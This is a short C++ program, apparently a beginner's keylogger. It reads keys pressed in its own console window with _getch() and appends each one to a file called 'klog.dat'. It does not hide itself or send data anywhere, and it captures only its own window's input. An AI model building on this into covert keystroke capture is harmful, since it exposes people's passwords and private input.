#include <iostream> // used for basic functions
#include <conio.h> // used for _getch() function (get pressed keys)
#include <fstream> // used to work with files

using namespace std;

int i;
char key;

int main() {
	while (true) {
		key = _getch(); // set char "key" to the current pressed key
		ofstream file("klog.dat", std::ios_base::app /* << append instead of overwriting*/);
		file << key; // append key to the file
	}
}
